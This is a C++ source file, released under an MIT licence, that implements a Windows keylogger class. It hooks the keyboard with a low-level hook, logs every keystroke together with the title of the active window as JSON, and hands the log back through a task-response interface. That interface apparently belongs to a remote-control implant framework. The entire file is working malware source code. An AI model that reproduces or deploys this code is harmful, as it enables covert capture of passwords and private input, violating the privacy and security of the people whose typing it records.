/*
MIT License

Copyright (c) 2025 solveditnpc

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Keylogger.h"

// Initialize the static member
Keylogger *Keylogger::active_instance = nullptr;

// Implement the keylog_start method
int Keylogger::keylog_start(const int &taskID)
{
    if (active_instance != nullptr)
    {
        // Keylogger is already running
        return 1;
    }

    active_instance = this;
    hook_thread_id = GetCurrentThreadId();
    logging_enabled = true;
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
    if (keyboard_hook == NULL)
    {
        logging_enabled = false;
        hook_thread_id = 0;
        active_instance = nullptr;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    logging_enabled = false;
    UnhookWindowsHookEx(keyboard_hook);
    keyboard_hook = NULL;
    active_instance = nullptr;

    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{"Keylogger started successfully."});
}

// Implement the keylog_stop method
int Keylogger::keylog_stop()
{
    if (active_instance == nullptr)
    {
        // Keylogger is not running
        return 1;
    }

    UnhookWindowsHookEx(keyboard_hook);
    keyboard_hook = NULL;
    PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
    hook_thread_id = 0;
    active_instance = nullptr;

    return 0;
}

// Implement the hook_proc method
LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code >= 0 && active_instance != nullptr)
    {
        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;

        // Check for window change
        HWND current_hwnd = GetForegroundWindow();
        if (current_hwnd != active_instance->last_window)
        {
            active_instance->last_window = current_hwnd;
            std::string new_window = active_instance->get_active_window_title();
            if (new_window != active_instance->current_window)
            {
                active_instance->current_window = new_window;
                active_instance->append_json_event(
                    "window", active_instance->current_window,
                    active_instance->current_window);
            }
        }

        if (wParam == WM_KEYDOWN)
        {
            std::string key_pressed;
            switch (pkey->vkCode)
            {
            case VK_RETURN:
                key_pressed = "(ENTER)\n";
                break;
            case VK_BACK:
                key_pressed = "(BACKSPACE)";
                break;
            case VK_SPACE:
                key_pressed = " ";
                break;
            case VK_TAB:
                key_pressed = "(TAB)";
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                key_pressed = "(SHIFT)";
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
                key_pressed = "(CTRL)";
                break;
            case VK_ESCAPE:
                key_pressed = "(ESCAPE)";
                break;
            case VK_END:
                key_pressed = "(END)";
                break;
            case VK_HOME:
                key_pressed = "(HOME)";
                break;
            case VK_LEFT:
                key_pressed = "(LEFT)";
                break;
            case VK_UP:
                key_pressed = "(UP)";
                break;
            case VK_RIGHT:
                key_pressed = "(RIGHT)";
                break;
            case VK_DOWN:
                key_pressed = "(DOWN)";
                break;
            case VK_DELETE:
                key_pressed = "(DELETE)";
                break;
            default:
                // Handle regular characters
                char key = MapVirtualKey(pkey->vkCode, MAPVK_VK_TO_CHAR);
                if (key != 0)
                {
                    key_pressed = key;
                }
            }

            // while testing uncomment the next line below
            // printf("%s", key_pressed.c_str());
            active_instance->append_json_event(
                "key", key_pressed, active_instance->current_window);
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

// Implement the get_keylog_data method
TaskResponse<std::string> Keylogger::get_keylog_data(const int &taskID)
{
    if (active_instance != nullptr)
    {
        active_instance->keylog_stop();
    }

    std::string result = keylog_data + "\n]";
    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{result});
}

// Implement the escape_json method
std::string Keylogger::escape_json(const std::string &value)
{
    std::string escaped;
    for (char character : value)
    {
        switch (character)
        {
        case '\\':
            escaped += "\\\\";
            break;
        case '"':
            escaped += "\\\"";
            break;
        case '\n':
            escaped += "\\n";
            break;
        case '\r':
            escaped += "\\r";
            break;
        case '\t':
            escaped += "\\t";
            break;
        default:
            escaped += character;
        }
    }
    return escaped;
}

// Implement the append_json_event method
void Keylogger::append_json_event(const std::string &type, const std::string &value,
                                  const std::string &window)
{
    if (!logging_enabled)
    {
        return;
    }

    if (!first_json_entry)
    {
        keylog_data += ",";
    }

    keylog_data += "\n  {\"type\":\"" + escape_json(type) +
                   "\",\"value\":\"" + escape_json(value) +
                   "\",\"window\":\"" + escape_json(window) + "\"}";
    first_json_entry = false;
}

// Implement the get_active_window_title method
std::string Keylogger::get_active_window_title()
{
    char window_title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, window_title, sizeof(window_title));
    return std::string(window_title);
}